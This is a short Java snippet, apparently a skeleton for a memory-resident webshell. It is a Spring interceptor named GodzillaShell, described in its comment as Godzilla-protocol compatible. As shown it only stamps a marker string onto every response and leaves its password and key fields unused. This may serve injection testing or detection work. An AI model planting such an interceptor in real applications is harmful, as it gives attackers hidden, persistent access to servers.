// Interceptor 注入位(哥斯拉协议兼容骨架)
public class GodzillaShell implements org.springframework.web.servlet.HandlerInterceptor {
    String pass = "pass", key = "key", md5 = "md5";
    public boolean preHandle(javax.servlet.http.HttpServletRequest r,
            javax.servlet.http.HttpServletResponse r2, Object h) throws Exception {
        r2.getWriter().write("SPECTRE-MARK-INTERCEPTOR");
        return true;
    }
}
